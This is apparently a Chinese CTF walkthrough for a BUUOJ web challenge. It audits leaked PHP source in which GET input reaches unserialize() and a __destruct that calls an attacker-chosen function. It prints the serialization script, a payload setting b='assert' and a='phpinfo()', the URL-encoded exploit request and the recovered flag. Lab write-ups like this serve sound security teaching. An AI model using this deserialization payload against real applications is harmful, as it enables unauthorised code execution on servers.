<FONT color=#3c3c3a>0</FONT><FONT color=#3b3b39>1</FONT><FONT color=#353533>0</FONT><FONT color=#020200>0</FONT><FONT color=#000000>10</FONT><FONT color=#010100>01</FONT><FONT color=#000000>0010010010010</FONT><FONT color=#0a0a0a>0</FONT><FONT color=#2c2c2c>1</FONT><FONT color=#3b3b3b>0</FONT><FONT color=#444444>0</FONT><FONT color=#505050>1</FONT><FONT color=#545454>0</FONT><FONT color=#616161>0</FONT><FONT color=#585858>1</FONT><FONT color=#252525>0</FONT><FONT color=#040404>0</FONT><FONT color=#000000>100100</FONT><FONT color=#030303>1</FONT><FONT color=#181818>0</FONT><FONT color=#252523>0</FONT><FONT color=#23241e>1</FONT><FONT color=#1e1f19>0</FONT><FONT color=#13140f>0</FONT><FONT color=#080904>1</FONT><FONT color=#000000>001</FONT><FONT color=#000002>0</FONT><FONT color=#000000>0100100100100</FONT><FONT color=#191919>1</FONT><FONT color=#3f3f3f>0</FONT><FONT color=#000000>0
<FONT color=#2c2c2a>1</FONT><FONT color=#292927>00</FONT><FONT color=#11110f>1</FONT><FONT color=#010100>0</FONT><FONT color=#000000>010010010010010</FONT><FONT color=#020202>0</FONT><FONT color=#000000>1</FONT><FONT color=#161616>0</FONT><FONT color=#373737>0</FONT><FONT color=#434343>1</FONT><FONT color=#484848>0</FONT><FONT color=#515151>0</FONT><FONT color=#454545>1</FONT><FONT color=#161616>0</FONT><FONT color=#000000>01001001</FONT><FONT color=#010101>0</FONT><FONT color=#040404>0</FONT><FONT color=#1b1b19>1</FONT><FONT color=#1f201a>0</FONT><FONT color=#14150f>0</FONT><FONT color=#0d0e09>1</FONT><FONT color=#070803>0</FONT><FONT color=#000000>010</FONT><FONT color=#000002>0</FONT><FONT color=#000000>100100100100</FONT><FONT color=#020202>1</FONT><FONT color=#292929>0</FONT><FONT color=#444444>0</FONT><FONT color=#010101>1
<FONT color=#201f1a>0</FONT><FONT color=#1f1e19>0</FONT><FONT color=#272621>1</FONT><FONT color=#292823>0</FONT><FONT color=#0d0c07>0</FONT><FONT color=#030200>1</FONT><FONT color=#020100>0</FONT><FONT color=#010000>0</FONT><FONT color=#000000>100100100100</FONT><FONT color=#020202>1</FONT><FONT color=#000000>0</FONT><FONT color=#080808>0</FONT><FONT color=#373737>1</FONT><FONT color=#404040>00</FONT><FONT color=#4b4b4b>1</FONT><FONT color=#2a2a2a>0</FONT><FONT color=#030303>0</FONT><FONT color=#020202>1</FONT><FONT color=#000000>0010010</FONT><FONT color=#020202>0</FONT><FONT color=#000000>1</FONT><FONT color=#121210>0</FONT><FONT color=#252621>0</FONT><FONT color=#0a0b06>1</FONT><FONT color=#0b0b09>0</FONT><FONT color=#0b0b0b>0</FONT><FONT color=#010101>1</FONT><FONT color=#000002>0</FONT><FONT color=#000004>0</FONT><FONT color=#000002>1</FONT><FONT color=#000000>001001001001</FONT><FONT color=#050505>0</FONT><FONT color=#323232>0</FONT><FONT color=#484848>1</FONT><FONT color=#000000>0
<FONT color=#1f1e19>0</FONT><FONT color=#201f1a>1</FONT><FONT color=#31302b>0</FONT><FONT color=#393833>0</FONT><FONT color=#2e2d28>1</FONT><FONT color=#13120d>0</FONT><FONT color=#010000>0</FONT><FONT color=#020100>1</FONT><FONT color=#000000>001001001001</FONT><FONT color=#020202>0</FONT><FONT color=#000000>01</FONT><FONT color=#212121>0</FONT><FONT color=#3a3a3a>0</FONT><FONT color=#3b3b3b>1</FONT><FONT color=#454545>0</FONT><FONT color=#232323>0</FONT><FONT color=#000000>1</FONT><FONT color=#020202>0</FONT><FONT color=#000000>010010010</FONT><FONT color=#060604>0</FONT><FONT color=#22231e>1</FONT><FONT color=#0c0d08>0</FONT><FONT color=#0b0b09>0</FONT><FONT color=#060606>1</FONT><FONT color=#010101>0</FONT><FONT color=#000002>0</FONT><FONT color=#000004>1</FONT><FONT color=#000002>0</FONT><FONT color=#000000>010010010010</FONT><FONT color=#0a0a0a>0</FONT><FONT color=#3e3e3e>1</FONT><FONT color=#4c4c4c>0</FONT><FONT color=#000000>0
<FONT color=#15140f>1</FONT><FONT color=#22211c>0</FONT><FONT color=#393833>0</FONT><FONT color=#41403b>1</FONT><FONT color=#403f3a>0</FONT><FONT color=#3f3e39>0</FONT><FONT color=#2a2924>1</FONT><FONT color=#080703>0</FONT><FONT color=#010101>0</FONT><FONT color=#000000>1</FONT><FONT color=#010101>0</FONT><FONT color=#000000>01001001001</FONT><FONT color=#010101>0</FONT><FONT color=#050505>0</FONT><FONT color=#2c2c2c>1</FONT><FONT color=#3b3b3b>0</FONT><FONT color=#434343>0</FONT><FONT color=#272727>1</FONT><FONT color=#000000>0</FONT><FONT color=#020202>0</FONT><FONT color=#000000>1001001</FONT><FONT color=#010101>0</FONT><FONT color=#000000>0</FONT><FONT color=#070705>1</FONT><FONT color=#1e1f1a>0</FONT><FONT color=#0c0d08>0</FONT><FONT color=#020200>1</FONT><FONT color=#010101>0</FONT><FONT color=#000000>0</FONT><FONT color=#000002>1</FONT><FONT color=#000004>0</FONT><FONT color=#000002>0</FONT><FONT color=#000000>100100100100</FONT><FONT color=#010101>1</FONT><FONT color=#212121>0</FONT><FONT color=#414141>0</FONT><FONT color=#000000>1
<FONT color=#15140f>0</FONT><FONT color=#1d1c17>0</FONT><FONT color=#302f2a>1</FONT><FONT color=#3d3c37>0</FONT><FONT color=#403f3a>0</FONT><FONT color=#393833>1</FONT><FONT color=#3b3a35>0</FONT><FONT color=#42413d>0</FONT><FONT color=#111111>1</FONT><FONT color=#000000>0</FONT><FONT color=#010101>01</FONT><FONT color=#000000>001001001001</FONT><FONT color=#060606>0</FONT><FONT color=#303030>0</FONT><FONT color=#3e3e3e>10</FONT><FONT color=#080808>0</FONT><FONT color=#010101>1</FONT><FONT color=#000000>0</FONT><FONT color=#010101>0</FONT><FONT color=#000000>10010</FONT><FONT color=#010101>0</FONT><FONT color=#000000>1</FONT><FONT color=#10100e>0</FONT><FONT color=#1f201b>0</FONT><FONT color=#0c0d08>1</FONT><FONT color=#020200>0</FONT><FONT color=#000000>01</FONT><FONT color=#000002>0</FONT><FONT color=#000004>0</FONT><FONT color=#000002>1</FONT><FONT color=#000000>0010010010010</FONT><FONT color=#181818>0</FONT><FONT color=#2b2b2b>1</FONT><FONT color=#020202>0
<FONT color=#14130e>0</FONT><FONT color=#181712>1</FONT><FONT color=#24231e>0</FONT><FONT color=#2d2c27>0</FONT><FONT color=#282722>1</FONT><FONT color=#25241f>0</FONT><FONT color=#292823>0</FONT><FONT color=#252420>1</FONT><FONT color=#292929>0</FONT><FONT color=#030303>0</FONT><FONT color=#020202>1</FONT><FONT color=#000000>0010010010010</FONT><FONT color=#010101>0</FONT><FONT color=#020202>1</FONT><FONT color=#2a2a2a>0</FONT><FONT color=#3c3c3c>0</FONT><FONT color=#252525>1</FONT><FONT color=#000000>0</FONT><FONT color=#020202>0</FONT><FONT color=#010101>1</FONT><FONT color=#000000>00100</FONT><FONT color=#010101>1</FONT><FONT color=#000000>0</FONT><FONT color=#11110f>0</FONT><FONT color=#12130e>1</FONT><FONT color=#0a0b06>0</FONT><FONT color=#000000>010</FONT><FONT color=#000002>0</FONT><FONT color=#000004>1</FONT><FONT color=#000002>0</FONT><FONT color=#000000>010010010010</FONT><FONT color=#020202>0100
<FONT color=#0d0c07>1</FONT><FONT color=#171611>0</FONT><FONT color=#1e1d18>0</FONT><FONT color=#24231e>100</FONT><FONT color=#272621>1</FONT><FONT color=#22211d>0</FONT><FONT color=#232323>0</FONT><FONT color=#0b0b0b>1</FONT><FONT color=#000000>0</FONT><FONT color=#030303>0</FONT><FONT color=#000000>1001001001001</FONT><FONT color=#020202>0</FONT><FONT color=#000000>0</FONT><FONT color=#1b1b1b>1</FONT><FONT color=#424242>0</FONT><FONT color=#0f0f0f>0</FONT><FONT color=#030303>1</FONT><FONT color=#000000>0010010</FONT><FONT color=#060606>0</FONT><FONT color=#40403e>1</FONT><FONT color=#252621>0</FONT><FONT color=#080904>0</FONT><FONT color=#030301>1</FONT><FONT color=#000000>00</FONT><FONT color=#000002>1</FONT><FONT color=#000004>0</FONT><FONT color=#000002>0</FONT><FONT color=#000000>100100100100</FONT><FONT color=#010101>1001
<FONT color=#080702>0</FONT><FONT color=#181712>0</FONT><FONT color=#171611>1</FONT><FONT color=#1b1a15>0</FONT><FONT color=#1f1e19>0</FONT><FONT color=#191813>1</FONT><FONT color=#181712>0</FONT><FONT color=#181713>0</FONT><FONT color=#151515>1</FONT><FONT color=#0a0a0a>0</FONT><FONT color=#020202>0</FONT><FONT color=#000000>100100100100100</FONT><FONT color=#010101>10</FONT><FONT color=#202020>0</FONT><FONT color=#363636>1</FONT><FONT color=#070707>0</FONT><FONT color=#010101>0</FONT><FONT color=#000000>10010</FONT><FONT color=#010101>0</FONT><FONT color=#181818>1</FONT><FONT color=#626260>0</FONT><FONT color=#31322d>0</FONT><FONT color=#0f100b>1</FONT><FONT color=#010100>0</FONT><FONT color=#000000>01</FONT><FONT color=#000002>0</FONT><FONT color=#000004>0</FONT><FONT color=#000002>1</FONT><FONT color=#000000>0010010010010010
<FONT color=#070601>0</FONT><FONT color=#161510>1</FONT><FONT color=#181712>00</FONT><FONT color=#1c1b16>1</FONT><FONT color=#100f0a>0</FONT><FONT color=#050400>0</FONT><FONT color=#010000>1</FONT><FONT color=#000000>0</FONT><FONT color=#020202>01</FONT><FONT color=#000000>001001001001001</FONT><FONT color=#010101>00</FONT><FONT color=#000000>1</FONT><FONT color=#3e3e3e>0</FONT><FONT color=#4d4d4d>0</FONT><FONT color=#050505>1</FONT><FONT color=#010101>0010</FONT><FONT color=#020202>0</FONT><FONT color=#000000>1</FONT><FONT color=#2f2f2f>0</FONT><FONT color=#5a5a58>0</FONT><FONT color=#272823>1</FONT><FONT color=#0b0c07>0</FONT><FONT color=#000000>010</FONT><FONT color=#000002>0</FONT><FONT color=#000004>1</FONT><FONT color=#000002>0</FONT><FONT color=#000000>0100100100100100
<FONT color=#050505>1</FONT><FONT color=#0c0c0c>0</FONT><FONT color=#090909>0</FONT><FONT color=#020202>1</FONT><FONT color=#000000>0010010010010010010010010</FONT><FONT color=#151515>0</FONT><FONT color=#555555>1</FONT><FONT color=#1b1b1b>0</FONT><FONT color=#020200>0</FONT><FONT color=#010100>1</FONT><FONT color=#000000>0</FONT><FONT color=#090907>0</FONT><FONT color=#0b0b09>1</FONT><FONT color=#000000>0</FONT><FONT color=#393937>0</FONT><FONT color=#585856>1</FONT><FONT color=#1d1d1d>0</FONT><FONT color=#050505>0</FONT><FONT color=#000000>1</FONT><FONT color=#010101>0</FONT><FONT color=#000000>01001001001001001001
0010010010010010010010010010</FONT><FONT color=#030303>01</FONT><FONT color=#3b3b3b>0</FONT><FONT color=#4e4e4e>0</FONT><FONT color=#040402>1</FONT><FONT color=#080806>0</FONT><FONT color=#0e0e0c>0</FONT><FONT color=#0b0b09>1</FONT><FONT color=#10100e>0</FONT><FONT color=#040402>0</FONT><FONT color=#333331>1</FONT><FONT color=#545452>0</FONT><FONT color=#1c1c1c>0</FONT><FONT color=#030303>1</FONT><FONT color=#000000>0010010010010010010010
0100100100100100100100100100</FONT><FONT color=#020202>1</FONT><FONT color=#000000>0</FONT><FONT color=#1c1c1c>0</FONT><FONT color=#5d5d5d>1</FONT><FONT color=#121210>0</FONT><FONT color=#000000>0</FONT><FONT color=#080806>1</FONT><FONT color=#0d0d0b>0</FONT><FONT color=#0b0b09>0</FONT><FONT color=#030301>1</FONT><FONT color=#343432>0</FONT><FONT color=#51514f>0</FONT><FONT color=#0d0d0d>1</FONT><FONT color=#020202>0</FONT><FONT color=#000000>0100100100100100100100
10010010010010010010010010010</FONT><FONT color=#030303>01</FONT><FONT color=#282828>0</FONT><FONT color=#585856>0</FONT><FONT color=#040402>1</FONT><FONT color=#2b2b29>0</FONT><FONT color=#2c2c2a>0</FONT><FONT color=#080806>1</FONT><FONT color=#252523>0</FONT><FONT color=#5c5c5a>0</FONT><FONT color=#171715>1</FONT><FONT color=#000000>0</FONT><FONT color=#050505>0</FONT><FONT color=#000000>1001001001001001001001
</FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></FONT></PRE><PRE>
<P>
<FONT color=#ffffff size=3>■👴■的■声■音■胜■过■👴■的■技■术■</FONT>
<FONT color=#ffffff size=3>By HELEN <span lang=EN-US style='font-size:10.0pt;mso-bidi-font-size:12.0pt;
font-family:Georgia;color:lime'><FONT color=#ffffff><a href="http://www.nwpu.edu.cn">QQ 123456789</a></FONT>
<p>百万前端的NPU报时中心为您报时：<a href="./time.php?source"></a></p>
<SCRIPT language=javascript>
function runClock() {
theTime = window.setTimeout("runClock()", 100);
var today = new Date();
var display= today.toLocaleString();
window.status=""+display+"大黑阔HELEN";
}runClock();
</SCRIPT>
</body>
</html>
2026-04-26 08:04:12
```

**发现1**：

一个重要的 `<script>` 标签：

```javascript
<SCRIPT language=javascript>
function runClock() {
theTime = window.setTimeout("runClock()", 100);
var today = new Date();
var display= today.toLocaleString();
window.status=""+display+"大黑阔HELEN";
}runClock();
</SCRIPT>
```

但这只是前端时间显示，真正的后端代码需要进一步探索。

**发现2**：

```html
<p>百万前端的NPU报时中心为您报时：<a href="./time.php?source"></a></p>
```

这个 `source` 参数没有赋值，非常可疑。

---

## 三、探索 `time.php`

### 3.1 访问 `time.php`

直接访问：

```http
http://7886f5ac-ffed-4327-bb1a-0b8ad761bc5d.node5.buuoj.cn:81/time.php
```

**返回**：

```
2026-04-26 08:15:41
```

### 3.2 测试 `source` 参数

访问：

```http
http://7886f5ac-ffed-4327-bb1a-0b8ad761bc5d.node5.buuoj.cn:81/time.php?source
```

**页面显示**：

```php
 <?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);


2026-04-26 08:17:41
```

得到 `time.php` 的源码！

---

## 四、代码审计

### 4.1 关键发现

1. 接收 GET 参数 `data`，对其进行**反序列化**操作
2. 有 `source` 参数时显示源码
3. 脚本结束时，对象`$c` 和 `$ppp` 都会被销毁，触发 `__destruct()` 方法

### 4.2 类 `HelloPhp` 结构

| 属性 |  类型  | 说明                 |
| :--: | :----: | -------------------- |
| `$a` | public | 将被作为参数传入函数 |
| `$b` | public | 将被作为函数名调用   |

### 4.3 魔术方法

**`__construct()`**：

- 在对象创建时自动调用
- 设置默认值：`$a = "Y-m-d h:i:s"`，`$b = "date"`

**`__destruct()`**：

- 在对象销毁时自动调用
- 执行 `echo $b($a);`
- 这意味着：把 `$b` 当作函数名，`$a` 当作参数，函数执行后，echo输出结果

### 4.4 代码运行流程

```php
$c = new HelloPhp;                    // 创建对象 $c，使用默认值
// ... 如果 ?source 则显示源码并结束 ...
@$ppp = unserialize($_GET["data"]);   // 反序列化用户输入，赋值给 $ppp
// 脚本结束，$c 和 $ppp 被销毁，触发各自的 __destruct()
```

### 4.5 漏洞点

**`unserialize()`** 函数反序列化用户可控的 `$_GET["data"]`，且没有进行任何过滤。通过构造特定的序列化字符串，我们可以控制 `$ppp` 对象的 `$a` 和 `$b` 属性，进而在 `__destruct()` 中执行任意函数。

---

## 五、Payload 构造过程

### 5.1 我们可控的是什么？

在 `__destruct()` 中：

```php
echo $b($a);
```

我们可以控制：

- `$b`：任意函数名
- `$a`：任意参数（字符串）

### 5.2 确定$b和$a

经过N次测试，最后选定`assert`函数。

我们需要构造一个序列化的 `HelloPhp` 对象，使得：

- `$b = "assert"`
- `$a = "phpinfo()"`

### 5.3 生成序列化字符串

编写 PHP 脚本：

```php
<?php

class HelloPhp
{
    public $a;
    public $b;
}

$obj = new HelloPhp();
$obj->a = "phpinfo()";
$obj->b = "assert";

echo serialize($obj);

?>
```

**输出**：

```
O:8:"HelloPhp":2:{s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";}

Process finished with exit code 0
```

### 5.4 序列化格式详解

| 部分              | 含义                                                    |
| ----------------- | ------------------------------------------------------- |
| `O:8:"HelloPhp"`  | o表示Object(对象)，类名长度 8，类名是 HelloPhp          |
| `:2:`             | 一共有 2 个属性                                         |
| `{`               | 开始属性列表                                            |
| `s:1:"a"`         | s表示string(字符串)，属性名的长度是 1，内容是 a         |
| `s:9:"phpinfo()"` | s表示string(字符串)，属性值的长度是 9，内容是 phpinfo() |
| `s:1:"b"`         | s表示string(字符串)，属性名的长度是 1，内容是 b         |
| `s:6:"assert"`    | s表示string(字符串)，属性值的长度是 6，内容是 assert    |
| `}`               | 结束                                                    |

### 5.5 URL 编码

序列化字符串中包含特殊字符（`:`、`"`、`{`、`}`、`;`），需要 URL 编码后作为 GET 参数 `data` 的值。

**原始**：`O:8:"HelloPhp":2:{s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";}`

**URL 编码后**：

```
O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A9%3A%22phpinfo()%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D
```

可以借助HackBar：

a. 将`O:8:"HelloPhp":2:{s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";}`复制、粘贴到HackBar的 URL 栏中；

b. 全选序列化字符串

c. encoding -> URL Encode

### 5.6 最终 Payload

```http
http://7886f5ac-ffed-4327-bb1a-0b8ad761bc5d.node5.buuoj.cn:81/time.php?data=O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A9%3A%22phpinfo()%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D
```

---

## 六、获取 Flag

访问上述 URL 后，页面返回一个完整的 `phpinfo()` 信息页面。

在页面中搜索 `flag`（Ctrl+F），即可找到 flag。

```html
flag{db666326-8312-4aaf-95c0-e99d88b7b1b7}
```

---

## 七、攻击流程总结

| 步骤 | 内容                                               |
| :--: | -------------------------------------------------- |
|  1   | 发现 time.php?source 可以查看源码                  |
|  2   | 源码中存在 unserialize($_GET["data"]) 反序列化漏洞 |
|  3   | 类 HelloPhp 的 __destruct() 执行 echo $b($a)       |
|  4   | 构造 payload，让 $b = "assert", $a = "phpinfo()"   |
|  5   | 序列化 → URL 编码 → 发送请求                       |
|  6   | assert("phpinfo()") 执行，输出 phpinfo() 页面      |
|  7   | 在 phpinfo() 中搜索 flag                           |

---

## 八、关键点总结

|  关键点   | 说明                                                 |
| :-------: | ---------------------------------------------------- |
| 源码泄露  | `?source` 参数显示源码                               |
| 漏洞类型  | PHP 反序列化 + `__destruct()` 代码执行               |
| 攻击函数  | `assert` 执行 PHP 代码                               |
| 目标函数  | `phpinfo()` 输出配置信息                             |
| Flag 位置 | 在 `phpinfo()` 输出页面中                            |
| 绕过难点  | 对象销毁顺序导致输出覆盖，利用 `assert` 直接输出绕过 |

---

✌✌✌

